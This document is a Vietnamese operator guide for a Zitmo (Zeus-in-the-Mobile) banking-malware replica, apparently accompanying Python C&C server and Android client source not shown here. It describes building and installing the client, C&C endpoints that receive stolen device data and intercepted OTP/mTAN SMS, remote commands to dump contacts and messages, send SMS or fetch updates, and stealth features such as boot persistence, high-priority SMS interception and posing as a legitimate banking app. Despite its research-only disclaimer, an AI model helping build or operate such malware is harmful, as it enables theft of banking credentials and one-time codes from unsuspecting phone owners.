# Hướng dẫn sử dụng Zitmo C&C Server và Client

## 1. Tổng quan

Hệ thống mô phỏng Zitmo bao gồm hai thành phần chính:

1. **Máy chủ C&C** (Command & Control) - `c2server.py`
2. **Client Android** - `ZitmoAndroidClient.java`

Hệ thống này mô phỏng cách thức hoạt động của malware Zitmo (Zeus-in-the-Mobile) trong việc đánh cắp thông tin xác thực từ thiết bị di động, đặc biệt là các mã xác thực OTP/mTAN trong giao dịch ngân hàng.

## 2. Thiết lập và khởi động máy chủ C&C

### Yêu cầu
- Python 3.6+
- Flask
- SQLite3

### Cài đặt
```
pip install flask
```

### Khởi động máy chủ
```
python c2server.py
```

Máy chủ sẽ hoạt động trên cổng 5000. Bạn có thể truy cập bảng điều khiển quản trị tại:
```
http://localhost:5000/admin
```

## 3. Xây dựng và cài đặt client Android

### Yêu cầu
- Android Studio 
- JDK 8 trở lên
- Thiết bị Android thực hoặc máy ảo chạy Android 5.0+

### Xây dựng APK
1. Tạo project Android mới trong Android Studio
2. Thêm tất cả các file từ mã nguồn đã cung cấp
3. Cập nhật địa chỉ IP của máy chủ C&C trong `ZitmoUtils.java`:
   ```java
   private static final String SERVER_URL_DEFAULT = "http://YOUR_SERVER_IP:5000";
   ```
4. Biên dịch và tạo APK: Build > Build Bundle(s) / APK(s) > Build APK(s)
5. APK sẽ được tạo trong thư mục `app/build/outputs/apk/debug/`

### Cài đặt APK trên thiết bị
1. Bật "Cài đặt từ nguồn không xác định" trong cài đặt bảo mật của thiết bị
2. Cài đặt APK bằng cách mở file APK trên thiết bị
3. Mở ứng dụng và cấp tất cả các quyền được yêu cầu
4. Nhấn "Kích hoạt ngay" để khởi động dịch vụ

## 4. Các API Endpoint trên máy chủ C&C

### 1. Đăng ký thiết bị
- **Endpoint**: `/register`
- **Method**: POST
- **Body**:
```json
{
    "device_id": "unique_device_identifier",
    "device_info": "thông tin thiết bị",
    "phone_number": "số điện thoại của thiết bị",
    "operator": "nhà mạng di động"
}
```

### 2. Gửi SMS bị chặn
- **Endpoint**: `/intercepted_sms`
- **Method**: POST
- **Body**:
```json
{
    "device_id": "unique_device_identifier",
    "sender": "người gửi SMS",
    "message": "nội dung SMS",
    "timestamp": "thời gian nhận"
}
```

### 3. Ping và nhận lệnh mới
- **Endpoint**: `/ping`
- **Method**: POST
- **Body**:
```json
{
    "device_id": "unique_device_identifier"
}
```

### 4. Báo cáo thực thi lệnh
- **Endpoint**: `/command_executed`
- **Method**: POST
- **Body**:
```json
{
    "device_id": "unique_device_identifier",
    "command_id": command_id,
    "result": "kết quả thực thi lệnh"
}
```

## 5. Gửi lệnh từ bảng điều khiển admin

1. Truy cập bảng điều khiển admin tại http://localhost:5000/admin
2. Chuyển đến tab "Lệnh điều khiển"
3. Chọn thiết bị mục tiêu từ danh sách
4. Chọn loại lệnh:
   - `get_contacts` - Lấy danh bạ
   - `get_sms` - Lấy tin nhắn (có thể chỉ định giới hạn số lượng)
   - `send_sms` - Gửi tin nhắn (cần chỉ định số người nhận và nội dung)
   - `update` - Cập nhật ứng dụng (cần chỉ định URL tải)
   - `uninstall` - Gỡ cài đặt ứng dụng
5. Nhập dữ liệu lệnh (nếu cần) theo định dạng JSON
6. Nhấn "Gửi lệnh"

Ví dụ dữ liệu lệnh:
- Lệnh `get_sms`: `{"limit": 50}`
- Lệnh `send_sms`: `{"to": "+84123456789", "message": "Đây là tin nhắn kiểm tra"}`

## 6. Cách thức hoạt động

1. Client Zitmo đăng ký với máy chủ C&C khi được cài đặt hoặc khởi động
2. Client lắng nghe và chặn tin nhắn SMS đến, gửi các SMS liên quan đến mTAN/OTP về máy chủ
3. Client ping máy chủ định kỳ (mặc định: 15 phút/lần) để báo cáo trạng thái và nhận lệnh mới
4. Client thực thi các lệnh từ máy chủ và báo cáo kết quả

## 7. Tính năng bảo mật và ẩn mình

- Lắng nghe SMS với độ ưu tiên cao (999) để có thể chặn tin nhắn trước khi ứng dụng khác nhận được
- Tự khởi động khi thiết bị khởi động
- Sử dụng foreground service và wakeLock để duy trì hoạt động ngay cả khi thiết bị vào chế độ ngủ
- Tự khởi động lại nếu bị hệ thống kết thúc
- Giả mạo ứng dụng ngân hàng hợp pháp với giao diện thân thiện để người dùng không nghi ngờ

## 8. Lưu ý quan trọng

- Mã nguồn này **CHỈ** phục vụ mục đích nghiên cứu, giáo dục và thử nghiệm trên thiết bị của chính bạn
- **KHÔNG** sử dụng với mục đích độc hại hoặc trên thiết bị của người khác khi không được phép
- Trong môi trường thực tế, cần bổ sung các biện pháp bảo mật như HTTPS, mã hóa dữ liệu, xác thực